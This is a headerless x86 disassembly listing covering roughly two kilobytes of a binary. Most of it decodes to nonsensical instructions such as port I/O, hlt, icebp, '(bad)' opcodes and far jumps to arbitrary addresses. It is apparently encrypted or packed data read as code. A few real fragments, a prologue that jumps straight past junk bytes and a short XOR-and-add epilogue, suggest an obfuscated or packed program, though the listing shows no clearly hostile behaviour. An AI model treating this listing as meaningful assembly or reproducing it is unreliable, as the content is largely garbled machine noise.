  41075a:	sub    BYTE PTR [edi],dl
  41075c:	ss div ebx
  41075f:	nop
  410760:	sbb    eax,0xbef804f3
  410765:	lods   al,BYTE PTR ds:[esi]
  410766:	out    dx,eax
  410767:	cmp    al,0x51
  410769:	mov    esp,0x8f887272
  41076e:	pop    eax
  41076f:	fidivr WORD PTR [ebx-0x4f]
  410772:	mov    bh,0xad
  410774:	sbb    ebp,DWORD PTR [ecx]
  410776:	lock lock repnz or cl,BYTE PTR [eax+eiz*1+0x675ac8d0]
  410780:	mov    edx,0xe971d7e0
  410785:	loop   0x41079d
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	pop    es
  4107a9:	and    eax,0x468b04da
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x1a70707d,eax
  4107b5:	jecxz  0x4107b5
  4107b7:	std    
  4107b8:	or     al,0x54
  4107ba:	dec    edx
  4107bb:	and    al,0x82
  4107bd:	popf   
  4107be:	xchg   DWORD PTR [ebp-0x67],ebx
  4107c1:	mov    ds:0x55d42c2f,al
  4107c6:	or     DWORD PTR [esi-0xc617175],ebp
  4107cc:	cld    
  4107cd:	xor    eax,0xa1ca38a9
  4107d2:	fistp  WORD PTR [eax-0x3e4f0032]
  4107d8:	sub    BYTE PTR [edi+0x6c1b3379],0x96
  4107df:	mov    ecx,0x3a567fee
  4107e4:	pop    edx
  4107e5:	nop    eax
  4107e8:	out    dx,eax
  4107e9:	sti    
  4107ea:	hlt    
  4107eb:	mov    eax,ds:0xa68cca28
  4107f0:	pop    ds
  4107f1:	cs pushf 
  4107f3:	es ds mov ch,0x5c
  4107f7:	or     DWORD PTR [esi],0xffffff9e
  4107fa:	sub    ch,BYTE PTR [ebx+eiz*4+0x64]
  4107fe:	icebp  
  4107ff:	lock ret 
  410801:	and    DWORD PTR [edi-0x59],0xfaf79a33
  410808:	push   es
  410809:	jge    0x41080d
  41080b:	sti    
  41080c:	cld    
  41080d:	aam    0x3e
  41080f:	retf   
  410810:	rcr    ecx,cl
  410812:	mov    eax,0x4c17d1ed
  410817:	ret    
  410818:	mov    BYTE PTR [esi+0xe],bl
  41081b:	or     bl,BYTE PTR [edi]
  41081d:	in     eax,dx
  41081e:	ret    0x2822
  410821:	xor    BYTE PTR [eax+0xd09590e],0x36
  410828:	sar    al,cl
  41082a:	push   edx
  41082b:	pop    esi
  41082c:	loop   0x4108ac
  41082e:	cmp    ebp,DWORD PTR [edx+ebp*4+0x73]
  410832:	fsubrp st(3),st
  410834:	xchg   edi,eax
  410835:	punpckhdq mm3,QWORD PTR [eax-0x1af99ff9]
  41083c:	inc    esp
  41083d:	sub    al,0x52
  41083f:	xlat   BYTE PTR ds:[ebx]
  410840:	xchg   ecx,eax
  410841:	iret   
  410842:	mov    eax,0x7afd2302
  410847:	mov    cl,0xc6
  410849:	nop
  41084a:	sti    
  41084b:	pushf  
  41084c:	stc    
  41084d:	adc    ecx,DWORD PTR [eax+0x24f5c7a4]
  410853:	daa    
  410854:	or     bh,BYTE PTR [eax]
  410856:	push   ds
  410857:	sub    ch,BYTE PTR [ebx]
  410859:	add    dl,BYTE PTR [esp+ebp*2-0x53f4b855]
  410860:	xchg   BYTE PTR [ebx],bh
  410862:	pop    edx
  410863:	pop    es
  410864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410865:	ror    DWORD PTR [eax+0x58],1
  410868:	mov    bh,0x62
  41086a:	dec    esi
  41086b:	mov    cl,0x6d
  41086d:	add    esp,DWORD PTR ds:0x6dcc9014
  410873:	push   edi
  410874:	inc    esp
  410875:	scas   al,BYTE PTR es:[edi]
  410876:	fisubr DWORD PTR [esi]
  410878:	(bad)  
  410879:	xchg   edx,eax
  41087a:	pop    esp
  41087b:	sub    al,0x0
  41087d:	sbb    BYTE PTR [ecx-0x132ae99d],ch
  410883:	push   ebx
  410884:	jb     0x41086d
  410886:	call   0xf443:0xdf170685
  41088d:	xlat   BYTE PTR ds:[ebx]
  41088e:	lods   al,BYTE PTR ds:[esi]
  41088f:	xlat   BYTE PTR ds:[ebx]
  410890:	aas    
  410891:	into   
  410892:	cdq    
  410893:	adc    al,0x26
  410895:	mov    ah,0xfe
  410897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410898:	arpl   ax,si
  41089a:	int    0x83
  41089c:	fldcw  WORD PTR [edx]
  41089e:	aam    0x9a
  4108a0:	retf   0x5be3
  4108a3:	outs   dx,BYTE PTR ds:[esi]
  4108a4:	inc    eax
  4108a5:	imul   edi,DWORD PTR [edi+0x52829850],0xff6b2f3e
  4108af:	or     al,0xa0
  4108b1:	shl    BYTE PTR [esi+0x6c412b27],1
  4108b7:	mov    ch,0x1c
  4108b9:	or     BYTE PTR [ecx+ecx*2-0x35],0x14
  4108be:	push   0xffffffb1
  4108c0:	popa   
  4108c1:	dec    ebp
  4108c2:	stos   BYTE PTR es:[edi],al
  4108c3:	lods   al,BYTE PTR ds:[esi]
  4108c4:	xor    dl,BYTE PTR [esi-0x5c61752c]
  4108ca:	imul   ecx,ebp,0x2
  4108cd:	and    al,0x8a
  4108cf:	cmp    dl,ah
  4108d1:	lods   al,BYTE PTR ds:[si]
  4108d3:	stos   DWORD PTR es:[edi],eax
  4108d4:	fmulp  st(4),st
  4108d6:	ss pusha 
  4108d8:	mov    ds:0x577d6619,eax
  4108dd:	pop    edx
  4108de:	iret   
  4108df:	sbb    ebx,DWORD PTR [ebx]
  4108e1:	int3   
  4108e2:	pusha  
  4108e3:	or     DWORD PTR [esi+0x62],esi
  4108e6:	adc    edx,DWORD PTR [esi-0x53]
  4108e9:	dec    esp
  4108ea:	xchg   ebx,eax
  4108eb:	call   FWORD PTR [edx-0x48]
  4108ee:	pop    esi
  4108ef:	jb     0x4108fc
  4108f1:	mov    bl,0x56
  4108f3:	out    0x6a,al
  4108f5:	or     dh,bh
  4108f7:	neg    BYTE PTR ds:0x44e6398
  4108fd:	(bad)  
  4108ff:	popf   
  410900:	scas   al,BYTE PTR es:[edi]
  410901:	mov    al,ds:0x28fac2ae
  410906:	fnsave [edx-0x4e]
  410909:	or     esp,DWORD PTR [edx-0x63d907f]
  41090f:	sbb    BYTE PTR [ebx],0x1d
  410912:	cmp    DWORD PTR ds:0x35d3283c,esp
  410918:	jecxz  0x41093a
  41091a:	or     ebx,ebx
  41091c:	(bad)  
  41091d:	mov    al,0xe0
  41091f:	ds mov dl,0xbb
  410922:	inc    edi
  410923:	adc    BYTE PTR [ebp+0x2d4a25e6],dl
  410929:	ja     0x4108c0
  41092b:	xor    BYTE PTR [ecx+esi*4],dl
  41092e:	(bad)  
  41092f:	ins    DWORD PTR es:[edi],dx
  410930:	(bad)  
  410932:	or     al,0x29
  410934:	(bad)  
  410935:	call   0xcc6c:0xfbef1df6
  41093c:	or     DWORD PTR [ecx],ebx
  41093e:	push   esi
  41093f:	pop    es
  410940:	imul   ecx,esi,0xc06efded
  410946:	call   0x1762b7b9
  41094b:	ror    BYTE PTR [ecx+0xb],cl
  41094e:	pop    ecx
  41094f:	mov    fs,edx
  410951:	int3   
  410952:	jbe    0x41094b
  410954:	sbb    DWORD PTR [edi+ecx*8-0x5a342504],0xffffffc7
  41095c:	dec    esp
  41095d:	xchg   ebp,eax
  41095e:	jmp    0x410926
  410960:	adc    ecx,DWORD PTR [eax]
  410962:	das    
  410963:	pop    esi
  410964:	in     eax,dx
  410965:	mov    edi,ebp
  410967:	jecxz  0x410998
  410969:	jl     0x4109d2
  41096b:	outs   dx,DWORD PTR ds:[esi]
  41096c:	push   edi
  41096e:	add    ebx,DWORD PTR [edi-0x60233d88]
  410974:	loopne 0x41091e
  410976:	cmp    edi,DWORD PTR [esi]
  410978:	(bad)  
  41097a:	call   0x7aa:0xabdc3632
  410981:	call   0xf118:0xfdd5cb58
  410988:	xchg   ebp,eax
  410989:	sbb    esi,esp
  41098b:	pop    es
  41098c:	mov    bh,0x11
  41098e:	ins    DWORD PTR es:[edi],dx
  41098f:	nop
  410990:	popf   
  410991:	data16 mov ds:0x91fd2c6d,al
  410997:	fdiv   QWORD PTR ds:0xa3a07c35
  41099d:	jge    0x41093b
  41099f:	jecxz  0x41096d
  4109a1:	pop    edi
  4109a2:	jle    0x410a20
  4109a4:	pop    edx
  4109a5:	jle    0x4109a2
  4109a7:	stc    
  4109a8:	fisubr WORD PTR [esi+0x52305e64]
  4109ae:	in     al,0x99
  4109b0:	repnz cmp eax,0x46a0c4f
  4109b6:	xchg   ecx,esi
  4109b8:	test   BYTE PTR [edx+esi*1+0x3259635f],al
  4109bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109c0:	pop    es
  4109c1:	retf   0xb09b
  4109c4:	in     al,0x41
  4109c6:	inc    esp
  4109c7:	jg     0x41096f
  4109c9:	ret    
  4109ca:	sar    BYTE PTR [esi],0xcc
  4109cd:	xchg   ecx,eax
  4109ce:	test   DWORD PTR [edx+0x6211c1d4],0x33cfd96f
  4109d8:	loopne 0x4109b8
  4109da:	sahf   
  4109db:	dec    eax
  4109dc:	sub    esp,edx
  4109de:	mov    eax,ds:0xc1339c94
  4109e3:	aas    
  4109e4:	and    edx,esp
  4109e6:	ds repnz adc eax,0xce47c622
  4109ed:	add    al,cl
  4109ef:	dec    eax
  4109f0:	out    dx,al
  4109f1:	shl    DWORD PTR [edi+0x62],cl
  4109f4:	xchg   ebp,esi
  4109f6:	xchg   edi,eax
  4109f7:	mov    al,bl
  4109f9:	pusha  
  4109fa:	loopne 0x410a26
  4109fc:	push   0x45366184
  410a01:	retf   
  410a02:	in     eax,dx
  410a03:	lock fwait
  410a05:	pop    eax
  410a06:	outs   dx,BYTE PTR ds:[esi]
  410a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a08:	xchg   edx,eax
  410a09:	add    DWORD PTR [edi+0x4e],eax
  410a0c:	leave  
  410a0d:	shl    BYTE PTR [eax-0x21],0xa8
  410a11:	cmp    DWORD PTR [ecx],edi
  410a13:	test   DWORD PTR [ecx+eax*2],0x751aa6a4
  410a1a:	ja     0x410a68
  410a1c:	or     ecx,DWORD PTR [edx]
  410a1e:	mov    esp,0x70443173
  410a23:	jb     0x410a9c
  410a25:	push   0xffffffd4
  410a27:	pop    ebx
  410a28:	dec    esi
  410a29:	add    ebp,DWORD PTR [esi]
  410a2b:	pop    es
  410a2c:	xor    bl,ch
  410a2e:	push   ds
  410a2f:	or     DWORD PTR [esi],ebx
  410a31:	sub    al,0x59
  410a33:	mov    ah,0xae
  410a35:	or     al,0xac
  410a37:	push   eax
  410a38:	es (bad) 
  410a3b:	push   es
  410a3c:	push   ss
  410a3d:	jno    0x410a22
  410a3f:	mov    BYTE PTR [edx],0xbf
  410a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a43:	and    esi,edi
  410a45:	xchg   BYTE PTR [eax+0x38],ah
  410a48:	pop    es
  410a49:	jns    0x410a19
  410a4b:	mov    ch,0x7b
  410a4d:	adc    al,0xa4
  410a4f:	dec    edi
  410a50:	mov    ch,0x37
  410a52:	push   eax
  410a53:	in     eax,0x79
  410a55:	scas   al,BYTE PTR es:[edi]
  410a56:	fdivr  QWORD PTR [edi-0x11]
  410a59:	and    eax,0x345a0a59
  410a5e:	mov    BYTE PTR [edx-0x58f85f38],al
  410a64:	cmp    al,0xb6
  410a66:	jmp    0x8117b3bd
  410a6b:	add    ah,BYTE PTR [edx+esi*2-0x10]
  410a6f:	mov    BYTE PTR [edx-0x4b],cl
  410a72:	(bad)  
  410a73:	scas   al,BYTE PTR es:[edi]
  410a74:	mov    esi,0xd321ee34
  410a79:	pop    ecx
  410a7a:	dec    ebp
  410a7b:	jae    0x410aa6
  410a7d:	and    ecx,esp
  410a7f:	and    eax,0x85b06076
  410a84:	or     al,0xb3
  410a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a87:	jle    0x410ab1
  410a89:	xchg   BYTE PTR [ebp+eax*4-0x2a52f3db],al
  410a90:	fsubr  DWORD PTR [edi]
  410a92:	jl     0x410ae9
  410a94:	add    eax,0xfd5df004
  410a99:	sub    ch,BYTE PTR es:[ebp-0x21ea269b]
  410aa0:	or     DWORD PTR [esi],ecx
  410aa2:	cmp    BYTE PTR [ebx-0x1e],bh
  410aa5:	out    0xd8,eax
  410aa7:	xchg   edx,eax
  410aa8:	add    dl,BYTE PTR [ebp-0xc]
  410aab:	mov    ecx,0xe757f350
  410ab0:	xor    eax,0x72e07c67
  410ab5:	dec    esp
  410ab6:	push   0x34ed16ae
  410abb:	ja     0x410a94
  410abd:	inc    edx
  410abe:	inc    ebx
  410abf:	pushf  
  410ac0:	je     0x410b05
  410ac2:	popa   
  410ac3:	push   ss
  410ac4:	mov    dl,0x4f
  410ac6:	ret    
  410ac7:	stc    
  410ac8:	fwait
  410ac9:	cld    
  410aca:	push   cs
  410acb:	dec    eax
  410acc:	sub    esp,DWORD PTR [ecx]
  410ace:	mov    ebp,0x4f4d44bb
  410ad3:	xor    BYTE PTR [ebx-0x32],0x51
  410ad7:	mov    bh,0x2
  410ad9:	int3   
  410ada:	popa   
  410adb:	dec    eax
  410adc:	mov    DWORD PTR [edx],0x5ecbee76
  410ae2:	aam    0xb2
  410ae4:	mov    eax,0xfd170c36
  410ae9:	dec    esp
  410aea:	lods   eax,DWORD PTR ds:[esi]
  410aeb:	outs   dx,DWORD PTR ds:[esi]
  410aec:	cli    
  410aed:	fsubrp st(6),st
  410aef:	pop    eax
  410af0:	push   cs
  410af1:	mov    al,ds:0xe447ab8f
  410af6:	icebp  
  410af7:	clc    
  410af8:	jl     0x410b07
  410afa:	adc    DWORD PTR [ebx],0xffffffec
  410afd:	aas    
  410afe:	test   DWORD PTR [eax-0x1d7b8222],eax
  410b04:	inc    ebp
  410b05:	xchg   ecx,eax
  410b06:	adc    eax,0x3e1f76d2
  410b0b:	mov    bh,0x47
  410b0d:	mov    ah,0xa5
  410b0f:	jge    0x410a9b
  410b11:	pop    esp
  410b12:	sub    eax,0x7a8a9c02
  410b17:	add    DWORD PTR [ecx],ecx
  410b19:	mov    al,ds:0x6f6dc552
  410b1e:	push   ebx
  410b1f:	ds or  eax,0x881c5cf6
  410b25:	add    edi,esp
  410b27:	icebp  
  410b28:	mov    ?,eax
  410b2a:	es push 0x5f731420
  410b30:	div    DWORD PTR [esi]
  410b32:	xchg   esp,eax
  410b33:	mov    dh,0x51
  410b35:	adc    eax,0x8aa2f099
  410b3a:	pop    ss
  410b3b:	ret    
  410b3c:	push   0x70
  410b3e:	xchg   ebp,edi
  410b40:	pop    esi
  410b41:	dec    edx
  410b42:	pop    ecx
  410b43:	or     DWORD PTR [esi+ebx*1-0x56],edx
  410b47:	adc    DWORD PTR [eax+0x5bfb88f5],esi
  410b4d:	mov    ah,0x5
  410b4f:	imul   edi,DWORD PTR [edi+0x3a437d0a],0xffffffb6
  410b56:	imul   edx,DWORD PTR [ebx+ebx*1],0x9f36c3d2
  410b5d:	bound  ecx,QWORD PTR [edx]
  410b5f:	loop   0x410af0
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz div dh
  410ba6:	mov    eax,0x70423ecc
  410bab:	jo     0x410c05
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c27
  410bb1:	add    DWORD PTR [ebp+0x4b],eax
  410bb4:	xchg   ebx,eax
  410bb5:	cmp    dl,BYTE PTR [ebp-0x7bcfa1f]
  410bbb:	xor    esp,ebp
  410bbd:	test   BYTE PTR [ecx-0x25a1837d],ch
  410bc3:	xchg   ebp,eax
  410bc4:	cdq    
  410bc5:	jno    0x410b5a
  410bc7:	shr    DWORD PTR [eax],0x86
  410bca:	mov    esp,0x559de0cb
  410bcf:	cmp    al,0xb2
  410bd2:	adc    bh,BYTE PTR [eax+edi*8+0x76ebb657]
  410bd9:	xor    eax,0x16e8e9c1
  410bde:	popa   
  410bdf:	jns    0x410c56
  410be1:	jl     0x410bfa
  410be3:	inc    ebp
  410be4:	dec    ebx
  410be5:	pop    edi
  410be6:	popf   
  410be7:	test   DWORD PTR [edx+ecx*8+0x508d9eeb],ebp
  410bee:	std    
  410bef:	popf   
  410bf0:	push   eax
  410bf1:	ror    DWORD PTR [esi-0x225a2264],0xf3
  410bf8:	das    
  410bf9:	xor    BYTE PTR [ebx],0x7f
  410bfc:	cmp    ebx,DWORD PTR [eax]
  410bfe:	cdq    
  410bff:	sbb    al,0x54
  410c01:	mov    ds:0x6f3e10a6,al
  410c06:	adc    DWORD PTR [edi+esi*2],esp
  410c09:	ret    0xc5da
  410c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c0d:	leave  
  410c0e:	les    edi,FWORD PTR [edi+ebp*2]
  410c11:	daa    
  410c12:	retf   0x9a40
  410c15:	in     eax,dx
  410c16:	es sub al,0x48
  410c19:	jmp    DWORD PTR [eax]
  410c1b:	retf   
  410c1c:	pop    ebp
  410c1d:	lea    ecx,ds:0xe43ef8fd
  410c23:	adc    DWORD PTR [ebp+eax*2-0x57],esp
  410c27:	push   edx
  410c28:	lea    eax,ds:0x1d69ce67
  410c2e:	test   DWORD PTR [ecx+edi*1],esp
  410c31:	xor    al,0x1d
  410c33:	call   0xc3f92056
  410c38:	loope  0x410c12
  410c3a:	jae    0x410c9c
  410c3c:	les    esp,FWORD PTR [esi-0x7454bc15]
  410c42:	imul   edx,ecx,0x20
  410c45:	pop    ecx
  410c46:	aad    0xfa
  410c48:	or     ah,BYTE PTR [edx+0x49]
  410c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c4c:	jbe    0x410c19
  410c4e:	push   ds
  410c4f:	jne    0x410c2e
  410c51:	jae    0x410cce
  410c53:	outs   dx,DWORD PTR ds:[esi]
  410c54:	mov    dl,0xa6
  410c56:	pop    edx
  410c57:	call   0xf0fd:0x2725e976
  410c5e:	inc    DWORD PTR [esi+0x56]
  410c61:	dec    ebx
  410c62:	dec    edi
  410c63:	push   ebp
  410c64:	mov    ah,BYTE PTR [esp+esi*1-0x6c]
  410c68:	sbb    eax,0x89e1cb66
  410c6d:	mov    eax,ds:0xcbec5657
  410c72:	push   es
  410c73:	push   eax
  410c74:	adc    DWORD PTR [ebx+0x250c8a6],0xfffffffd
  410c7b:	fnstsw WORD PTR [ebx+eax*2+0x35]
  410c7f:	jno    0x410ccc
  410c81:	retf   0x6b6f
  410c84:	mov    eax,0x65b31a5e
  410c89:	adc    BYTE PTR [ecx-0x36],ah
  410c8c:	fsub   DWORD PTR [edi-0x3]
  410c8f:	out    0x56,al
  410c91:	jmp    0xa4a:0xa833821d
  410c98:	test   eax,0xb0793318
  410c9d:	pop    es
  410c9e:	imul   ebx,DWORD PTR [edi+0x38],0xffffffed
  410ca2:	inc    ecx
  410ca3:	mov    bl,BYTE PTR [edi]
  410ca5:	add    esp,edi
  410ca7:	iret   
  410ca8:	mov    eax,ds:0x8ba5765a
  410cad:	mov    DWORD PTR [eax-0x216a14c0],ecx
  410cb3:	or     dh,BYTE PTR gs:[ebp+edi*4-0x65]
  410cb8:	xchg   esp,eax
  410cb9:	sub    cl,0xf0
  410cbc:	and    BYTE PTR [esi],dl
  410cbe:	push   esp
  410cbf:	les    ecx,FWORD PTR [ebx-0x27]
  410cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cc3:	pop    ss
  410cc4:	xlat   BYTE PTR ds:[ebx]
  410cc5:	mov    ecx,esi
  410cc7:	iret   
  410cc8:	add    esi,DWORD PTR [eax+0x12]
  410ccb:	dec    esi
  410ccc:	mov    WORD PTR [ebx+0x6f],?
  410ccf:	mov    edi,0x72f73a10
  410cd4:	fnsave [edx]
  410cd6:	pop    esp
  410cd7:	popa   
  410cd8:	lea    ebp,[edx+0x1587911a]
  410cde:	int3   
  410cdf:	cmp    dl,BYTE PTR [esi+0x49]
  410ce2:	sbb    BYTE PTR [eax],0x5b
  410ce5:	jecxz  0x410d56
  410ce7:	ja     0x410cff
  410ce9:	or     DWORD PTR [ecx+0x2d438259],ecx
  410cef:	jge    0x410c9c
  410cf1:	inc    esi
  410cf2:	nop
  410cf3:	ror    dh,0x3b
  410cf6:	jae    0x410ccd
  410cf8:	hlt    
  410cf9:	push   ecx
  410cfa:	jbe    0x410c8d
  410cfc:	icebp  
  410cfd:	mov    eax,ds:0x2720d72e
  410d02:	push   0xffffffbf
  410d04:	aad    0x6a
  410d06:	push   cs
  410d07:	sbb    bh,BYTE PTR [esi+0x162c839d]
  410d0d:	addr16 pop edx
  410d0f:	mov    al,0x6c
  410d11:	sbb    ecx,DWORD PTR [ebx]
  410d13:	lahf   
  410d14:	pop    edi
  410d15:	jnp    0x410d4c
  410d17:	pop    ss
  410d18:	pop    ebp
  410d19:	push   ecx
  410d1a:	shl    DWORD PTR [edx],cl
  410d1c:	mov    bh,0x6a
  410d1e:	pop    es
  410d1f:	jge    0x410ce9
  410d21:	pop    ds
  410d22:	inc    esp
  410d23:	(bad)  
  410d24:	in     eax,0xa4
  410d26:	inc    esi
  410d27:	pop    ax
  410d29:	imul   edx,DWORD PTR [edi+ebp*2-0x4f],0xffffffd2
  410d2e:	cmp    eax,0x375912dd
  410d33:	mov    bl,0xbd
  410d35:	(bad)  [ebx-0x44c7214d]
  410d3b:	aaa    
  410d3c:	lock xlat BYTE PTR ds:[ebx]
  410d3e:	fcom   QWORD PTR cs:[edi]
  410d41:	cmp    ebx,DWORD PTR ds:0x5b354742
  410d47:	shl    BYTE PTR ds:0xfdeac7d3,cl
  410d4d:	jl     0x410d0d
  410d4f:	in     eax,0xd1
  410d51:	jmp    0xa58b:0x5f85c1c0
  410d58:	in     eax,dx
  410d59:	sahf   
  410d5a:	mov    cl,0xeb
  410d5c:	mov    esi,DWORD PTR [edx-0x4c]
  410d5f:	popa   
  410d60:	xchg   edx,eax
  410d61:	fidiv  WORD PTR [edi-0x2e2c5ce4]
  410d67:	fsubr  DWORD PTR ss:[edi]
  410d6a:	sub    DWORD PTR [eax+0x3a],edx
  410d6d:	and    DWORD PTR [edx],esi
  410d6f:	jp     0x410d59
  410d71:	fucomp st(5)
  410d73:	mov    dh,BYTE PTR [esi+0x65]
  410d76:	je     0x410d56
  410d78:	mov    edi,DWORD PTR [ebx*8+0xbcbf675]
  410d7f:	xchg   DWORD PTR [ebx],ebp
  410d81:	fcom   QWORD PTR [ecx+0x4fe96e58]
  410d87:	lds    esi,FWORD PTR [ecx]
  410d89:	inc    edx
  410d8a:	out    0x12,eax
  410d8c:	aad    0x80
  410d8e:	stos   BYTE PTR es:[edi],al
  410d8f:	test   BYTE PTR [edx-0x3c],ah
  410d92:	jne    0x410d18
  410d94:	push   0x193cc9f0
  410d99:	(bad)  
  410d9a:	cwde   
  410d9b:	leavew 
  410d9d:	mov    dh,bl
  410d9f:	lods   al,BYTE PTR ds:[esi]
  410da0:	mov    es,WORD PTR [ecx-0x1]
  410da3:	inc    esi
  410da4:	lea    ecx,[eax+0x75587192]
  410daa:	xor    esi,DWORD PTR [esi+0x10]
  410dad:	mov    ds:0x35bb4970,al
  410db2:	(bad)  
  410db3:	ror    DWORD PTR [esi+0x7a],cl
  410db6:	shl    DWORD PTR [ebp-0x70],0xa
  410dba:	cmp    BYTE PTR [edi],dl
  410dbc:	inc    ebx
  410dbd:	push   ss
  410dbe:	inc    edx
  410dbf:	cwde   
  410dc0:	mov    esi,0xbd4fa6e0
  410dc5:	xor    BYTE PTR [edi+esi*4-0x7e520991],0xd5
  410dcd:	ins    DWORD PTR es:[edi],dx
  410dce:	and    al,0xb4
  410dd0:	inc    esp
  410dd1:	sar    DWORD PTR fs:[ecx+0x3f],1
  410dd5:	fsubr  DWORD PTR [edx]
  410dd7:	or     al,0x3c
  410dd9:	leave  
  410dda:	mov    edi,0x54af5729
  410ddf:	and    DWORD PTR [ecx+0x5a],edx
  410de2:	inc    ebx
  410de3:	lock pop edi
  410de5:	sbb    dh,BYTE PTR [eax]
  410de7:	xor    dl,BYTE PTR [eax-0x23e4f11b]
  410ded:	ret    0x3517
  410df0:	pusha  
  410df1:	jge    0x410d8f
  410df3:	mov    esi,esp
  410df5:	mov    esp,0x39291a4
  410dfa:	adc    ax,0x1b4a
  410dfe:	test   BYTE PTR [ebp-0x69],bl
  410e01:	adc    BYTE PTR [esi+edx*4],0x14
  410e05:	loop   0x410df1
  410e07:	js     0x410d8f
  410e09:	jg     0x410e81
  410e0b:	cdq    
  410e0c:	loopne 0x410dd6
  410e0e:	mov    ebx,0x5c8dd6a7
  410e13:	push   edx
  410e14:	mov    cl,0x2a
  410e16:	xchg   ebx,eax
  410e17:	ret    
  410e18:	hlt    
  410e19:	mov    BYTE PTR [eax+0x6d3cfb9],ah
  410e1f:	out    0xfa,eax
  410e21:	in     al,0x59
  410e23:	popa   
  410e24:	ret    
  410e25:	shr    DWORD PTR [ebp+ebp*2+0x617fda8b],0xe6
  410e2d:	in     eax,dx
  410e2e:	cs je  0x410dc9
  410e31:	addr16 jno 0x410e63
  410e34:	repnz adc eax,0x85effd39
  410e3a:	push   cs
  410e3b:	xor    al,0xfd
  410e3d:	scas   eax,DWORD PTR es:[edi]
  410e3e:	mov    ch,0xe6
  410e40:	push   ebx
  410e41:	cmp    al,0x42
  410e43:	adc    edi,DWORD PTR [eax+0x26]
  410e46:	fsub   DWORD PTR [eax-0x50]
  410e49:	pop    esi
  410e4a:	xchg   edx,eax
  410e4b:	jmp    0x410eca
  410e4d:	sahf   
  410e4e:	pop    es
  410e4f:	daa    
  410e50:	jmp    0x9853:0x39efc16e
  410e57:	loope  0x410e7b
  410e59:	or     BYTE PTR [edx+eax*2+0x35],al
  410e5d:	adc    ebx,ebp
  410e5f:	das    
  410e60:	mov    BYTE PTR [esi*1+0x60ff834b],dh
  410e67:	jmp    0x410e70
  410e69:	(bad)  
  410e6a:	adc    cl,cl
  410e6c:	out    dx,al
  410e6d:	pop    esp
  410e6e:	mov    bh,0x2d
  410e70:	jmp    0x1eb88a97
  410e75:	fiadd  DWORD PTR [ebp+0x7e8973a8]
  410e7b:	xor    eax,0xf232449
  410e80:	loope  0x410ead
  410e82:	dec    edx
  410e83:	mov    BYTE PTR [ebx+0x9bdf82a],bl
  410e89:	mov    al,ds:0xfa32c468
  410e8e:	sbb    DWORD PTR [ebx+edx*8+0x12],esp
  410e92:	push   ss
  410e93:	test   eax,0x6821babe
  410e98:	mov    BYTE PTR [edx-0xa54b357],cl
  410e9e:	xchg   ebx,eax
  410e9f:	cmp    DWORD PTR [esi],0x4c168c4b
  410ea5:	jno    0x410ebd
  410ea7:	pop    edi
  410ea8:	inc    edi
  410ea9:	push   edx
  410eaa:	repz lds ecx,FWORD PTR [ebp+edi*4+0x3c]
  410eaf:	mov    WORD PTR [ebx+0x760e0de],fs
  410eb5:	adc    eax,0xd53a93f3
  410eba:	enter  0x4801,0xce
  410ebe:	outs   dx,DWORD PTR ds:[esi]
  410ebf:	ja     0x410ec8
  410ec1:	xchg   DWORD PTR gs:[edx-0x27],ebx
  410ec5:	jmp    0xc451346d
  410eca:	in     al,0xf
  410ecc:	or     edx,DWORD PTR [ebp+ebp*2-0x22]
  410ed0:	or     bl,BYTE PTR [ecx+0x39de62e5]
  410ed6:	pop    esp
  410ed7:	adc    al,0x93
  410ed9:	jl     0x410e71
  410edb:	add    bh,BYTE PTR [ebx+0x4366be2]
  410ee1:	lock cdq 
  410ee3:	in     eax,dx
  410ee4:	jb     0x410f20
  410ee6:	bound  ecx,QWORD PTR [edx+0x73d3aea4]
  410eec:	sbb    al,cl
  410eee:	adc    al,bl
  410ef0:	pop    ecx
  410ef1:	inc    eax
  410ef2:	in     eax,0x95
  410ef4:	mov    ebp,0xf459cf9a
  410ef9:	dec    DWORD PTR [esi+0x12]
  410efc:	or     ecx,eax
  410efe:	pop    DWORD PTR [esi+0x5bd8160e]
  410f04:	imul   ebp,DWORD PTR [eax-0x32],0xffffffe6
  410f08:	add    esi,DWORD PTR [eax]
  410f0a:	cld    
  410f0b:	push   edi
  410f0c:	push   0x1e
  410f0e:	(bad)  
  410f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f10:	scas   eax,DWORD PTR es:[edi]
  410f11:	xor    BYTE PTR [ebx+0x5e],0x95
  410f15:	das    
  410f16:	mov    esi,0xa6dd7675
  410f1b:	mov    al,ds:0x637db55d
  410f20:	fscale 
  410f22:	or     edx,edi
  410f24:	inc    eax
  410f25:	gs and esp,0xbf3ff6a3
  410f2c:	out    0xa8,eax
  410f2e:	imul   ebp
  410f30:	pop    es
  410f31:	and    DWORD PTR [esi],ebx
